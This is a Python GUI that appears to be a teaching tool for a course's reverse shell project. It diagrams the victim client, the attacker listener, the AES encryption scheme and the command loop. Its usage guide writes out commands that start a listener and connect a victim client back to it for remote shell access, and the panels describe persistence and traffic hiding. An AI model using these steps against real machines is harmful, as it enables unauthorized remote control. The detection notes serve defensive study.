#!/usr/bin/env python3
"""
PROJECT #5 — REVERSE SHELL VISUALIZER & GUI
Educational visualization tool to understand the reverse shell workflow
"""

import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time

class ReverseShellVisualizer:
    def __init__(self, root):
        self.root = root
        self.root.title("Project #5 - Reverse Shell Visualizer")
        self.root.geometry("1200x800")
        self.root.configure(bg="#1a1a1a")
        
        # Custom styles
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background='#1a1a1a')
        style.configure('TLabel', background='#1a1a1a', foreground='#00ff00')
        style.configure('TButton', background='#2a2a2a', foreground='#00ff00')
        style.configure('Title.TLabel', background='#1a1a1a', foreground='#00ffff', font=('Courier', 14, 'bold'))
        
        self.create_widgets()
        self.animation_running = False
        
    def create_widgets(self):
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Title
        title = ttk.Label(main_frame, text="🔒 REVERSE SHELL ARCHITECTURE & WORKFLOW", style='Title.TLabel')
        title.grid(row=0, column=0, columnspan=3, pady=10)
        
        # ============ LEFT PANEL - ARCHITECTURE ============
        self.create_architecture_panel(main_frame)
        
        # ============ MIDDLE PANEL - WORKFLOW ============
        self.create_workflow_panel(main_frame)
        
        # ============ RIGHT PANEL - ENCRYPTION ============
        self.create_encryption_panel(main_frame)
        
        # ============ BOTTOM - ANIMATION & CONTROLS ============
        self.create_control_panel(main_frame)
        
    def create_architecture_panel(self, parent):
        """Left panel showing architecture"""
        panel = ttk.LabelFrame(parent, text="📋 ARCHITECTURE", padding="10")
        panel.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5, pady=5)
        
        arch_text = """
VICTIM MACHINE (Infected)
├── client.py (Reverse Shell Payload)
│   ├── Tries to connect to Listener every 5s
│   ├── Executes remote commands
│   └── Encrypts responses with AES-256
│
└── Characteristics:
    ├── Runs persistently in background
    ├── Auto-reconnects on connection loss
    ├── Executes commands in shell context
    └── Hides network traffic via encryption

═════════════════════════════════
           NETWORK
   TCP Port 4444 (Configurable)
   All data encrypted with AES-256
═════════════════════════════════

ATTACKER MACHINE
├── listener.py (Command & Control)
│   ├── Listens for incoming connections
│   ├── Accepts encrypted commands
│   └── Decrypts shell responses
│
└── Characteristics:
    ├── Interactive command prompt
    ├── Real-time output display
    ├── Directory state persistence
    └── Color-coded output formatting
        """
        
        text_widget = tk.Text(panel, height=30, width=35, bg="#0a0a0a", 
                             fg="#00ff00", font=('Courier', 9), relief=tk.FLAT)
        text_widget.insert('1.0', arch_text)
        text_widget.config(state=tk.DISABLED)
        text_widget.pack(fill=tk.BOTH, expand=True)
        
    def create_workflow_panel(self, parent):
        """Middle panel showing workflow steps"""
        panel = ttk.LabelFrame(parent, text="⚙️  WORKFLOW SEQUENCE", padding="10")
        panel.grid(row=1, column=1, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5, pady=5)
        
        # Canvas for animation
        self.workflow_canvas = tk.Canvas(panel, width=250, height=500, bg="#0a0a0a", 
                                        highlightthickness=0)
        self.workflow_canvas.pack(fill=tk.BOTH, expand=True)
        
        self.draw_workflow()
        
    def draw_workflow(self):
        """Draw the workflow diagram"""
        canvas = self.workflow_canvas
        canvas.delete("all")
        
        steps = [
            ("1. Client Startup", "Victim runs client.py\nwith server IP:port"),
            ("2. Connection", "Client connects to\nListener (TCP Port 4444)"),
            ("3. Auth Handshake", "Send initial CWD\n(Current Directory)"),
            ("4. Command Sent", "Attacker types\ncommand at prompt"),
            ("5. Encryption", "Command encrypted\nwith AES-256-CBC"),
            ("6. Transmission", "Encrypted command\nsent over TCP"),
            ("7. Execution", "Client executes\ncommand in shell"),
            ("8. Response", "Output encrypted &\nsent back"),
            ("9. Decryption", "Listener decrypts\nresponse"),
            ("10. Loop Back", "Ready for next\ncommand (Step 4)"),
        ]
        
        y_pos = 20
        for i, (title, desc) in enumerate(steps):
            color = "#00ff00" if i % 2 == 0 else "#ffaa00"
            
            # Box
            canvas.create_rectangle(20, y_pos, 230, y_pos + 35, 
                                   fill="#1a1a1a", outline=color, width=2)
            canvas.create_text(25, y_pos + 5, text=title, anchor="nw", 
                             fill=color, font=('Courier', 9, 'bold'))
            canvas.create_text(25, y_pos + 18, text=desc, anchor="nw", 
                             fill="#00ff00", font=('Courier', 7))
            
            # Arrow
            if i < len(steps) - 1:
                canvas.create_line(125, y_pos + 35, 125, y_pos + 40, 
                                 fill=color, width=2)
                canvas.create_polygon(125, y_pos + 45, 120, y_pos + 40, 
                                    130, y_pos + 40, fill=color)
            
            y_pos += 45
            
    def create_encryption_panel(self, parent):
        """Right panel showing encryption details"""
        panel = ttk.LabelFrame(parent, text="🔐 ENCRYPTION DETAILS", padding="10")
        panel.grid(row=1, column=2, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5, pady=5)
        
        enc_text = """
ENCRYPTION SCHEME
═══════════════════════════════

Algorithm: AES-256-CBC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
├── Block Size: 128 bits
├── Key Size: 256 bits
├── Mode: Cipher Block Chaining
└── Padding: PKCS7

KEY DERIVATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Function: PBKDF2-HMAC-SHA256
├── Passphrase: "ultraprohacker"
│   (customizable via --passphrase)
├── Salt: b"project5salt99"
├── Iterations: 100,000
└── Key Length: 32 bytes

FRAMING PROTOCOL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[4-byte length][Encrypted Data]
  Big-endian      IV (16) + CT
  uint32            (encrypted)

DATA FLOW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Plaintext
   ↓ [Padding - PKCS7]
Padded Data
   ↓ [Generate Random IV]
   ↓ [AES Encrypt]
IV + Ciphertext
   ↓ [Frame with length]
Network Packet
        """
        
        text_widget = tk.Text(panel, height=30, width=35, bg="#0a0a0a", 
                             fg="#ffaa00", font=('Courier', 8), relief=tk.FLAT)
        text_widget.insert('1.0', enc_text)
        text_widget.config(state=tk.DISABLED)
        text_widget.pack(fill=tk.BOTH, expand=True)
        
    def create_control_panel(self, parent):
        """Bottom panel with demo controls"""
        panel = ttk.LabelFrame(parent, text="🎬 INTERACTIVE DEMO", padding="10")
        panel.grid(row=2, column=0, columnspan=3, sticky=(tk.W, tk.E), padx=5, pady=5)
        
        # Buttons
        btn_frame = ttk.Frame(panel)
        btn_frame.pack(side=tk.LEFT, padx=10)
        
        self.animate_btn = ttk.Button(btn_frame, text="▶ Animate Communication", 
                                     command=self.start_animation)
        self.animate_btn.pack(side=tk.LEFT, padx=5)
        
        info_btn = ttk.Button(btn_frame, text="ℹ️  Key Features", 
                             command=self.show_features)
        info_btn.pack(side=tk.LEFT, padx=5)
        
        usage_btn = ttk.Button(btn_frame, text="📖 Usage Guide", 
                              command=self.show_usage)
        usage_btn.pack(side=tk.LEFT, padx=5)
        
        # Status text
        self.status_label = ttk.Label(panel, text="Ready • Click 'Animate Communication' to see the flow",
                                     foreground="#00ff00")
        self.status_label.pack(side=tk.LEFT, padx=20)
        
    def start_animation(self):
        """Animate the connection flow"""
        if self.animation_running:
            return
        
        self.animation_running = True
        self.animate_btn.config(state=tk.DISABLED)
        
        thread = threading.Thread(target=self._run_animation, daemon=True)
        thread.start()
        
    def _run_animation(self):
        """Animation sequence"""
        messages = [
            "🔄 [STEP 1] Client connecting to 127.0.0.1:4444...",
            "✅ [STEP 2] Connection established! Client sends CWD",
            "🔒 [STEP 3] Deriving AES-256 key from passphrase (PBKDF2)...",
            "⏳ [STEP 4] Waiting for command from attacker...",
            "💬 [STEP 5] Attacker types: whoami",
            "🔐 [STEP 6] Encrypting: 'whoami' with AES-256-CBC",
            "📤 [STEP 7] Sending 44 bytes of encrypted data",
            "⚙️  [STEP 8] Client executing 'whoami' command...",
            "📊 [STEP 9] Command output: 'administrator'",
            "🔒 [STEP 10] Encrypting response with AES-256-CBC",
            "📥 [STEP 11] Sending 128 bytes of encrypted response",
            "🔓 [STEP 12] Listener decrypting response...",
            "✨ [STEP 13] Output displayed: 'administrator'",
            "🔄 [STEP 14] Ready for next command (loop back to Step 4)",
        ]
        
        for msg in messages:
            self.status_label.config(text=msg, foreground="#00ffff")
            self.root.update()
            time.sleep(0.5)
        
        self.status_label.config(text="✅ Animation complete! • Ready for next demo",
                                foreground="#00ff00")
        self.animate_btn.config(state=tk.NORMAL)
        self.animation_running = False
        
    def show_features(self):
        """Show key features"""
        features = """PROJECT #5 - REVERSE SHELL
KEY FEATURES
═════════════════════════════════════════

🔌 CONNECTION & PERSISTENCE
  • Auto-reconnection every 5 seconds
  • Handles network interruptions gracefully
  • Maintains directory state (cd commands)
  • Cross-platform (Windows & Unix-like)

🔐 SECURITY & ENCRYPTION
  • AES-256-CBC encryption (military grade)
  • PBKDF2-HMAC-SHA256 key derivation (100k iterations)
  • Random IV for each message (no patterns)
  • Customizable passphrase protection

⚙️  COMMAND EXECUTION
  • Full shell access (pipes, redirects, builtins)
  • 30-second timeout protection
  • Error handling & feedback
  • Native 'cd' command support

📊 OPERATIONAL
  • Color-coded terminal output (Listener)
  • Real-time command execution
  • Timestamp logging
  • Clean disconnection handling

⚠️  ETHICAL LIMITATIONS
  • Designed for authorized lab/pentest use only
  • Includes ethical warnings on startup
  • Educational purposes in secure environments
  • Demonstrates post-exploitation techniques

🛡️  DETECTION VECTORS
  • Network-layer: IDS/IPS rules for repeated connections
  • Behavioral: Unusual outbound traffic patterns
  • Host-level: Process monitoring for reverse shells
  • Traffic analysis: Encrypted traffic analysis (size/timing)
"""
        messagebox.showinfo("Key Features", features)
        
    def show_usage(self):
        """Show usage guide"""
        usage = """QUICK START GUIDE
═════════════════════════════════════════

STEP 1: START THE LISTENER (Attacker Side)
  $ python3 listener.py --port 4444 --passphrase mysecret
  
  Options:
    --host        Bind address (default: 0.0.0.0)
    --port        Listen port (default: 4444)
    --passphrase  AES passphrase (default: ultraprohacker)

STEP 2: START THE CLIENT (Victim Side)
  $ python3 client.py --ip 192.168.1.10 --port 4444 --passphrase mysecret
  
  Options:
    --ip          Listener IP address (required)
    --port        Listener port (default: 4444)
    --passphrase  AES passphrase (must match listener!)

STEP 3: INTERACT WITH THE SHELL
  Once client connects, you see the prompt:
    shell@192.168.1.5 [/home/victim]> whoami
    
  • Type any shell command
  • Output is displayed in a formatted box
  • 'cd' changes directory (persistent)
  • 'exit' terminates the client
  • Ctrl+C disconnects current session

IMPORTANT NOTES
  ⚠️  Passphrase must match on BOTH sides
  ⚠️  For authorized testing only
  ⚠️  Network must allow outbound connections
  ⚠️  Encrypted traffic may still be detected by IDS
"""
        messagebox.showinfo("Usage Guide", usage)


def main():
    root = tk.Tk()
    app = ReverseShellVisualizer(root)
    root.mainloop()


if __name__ == "__main__":
    main()
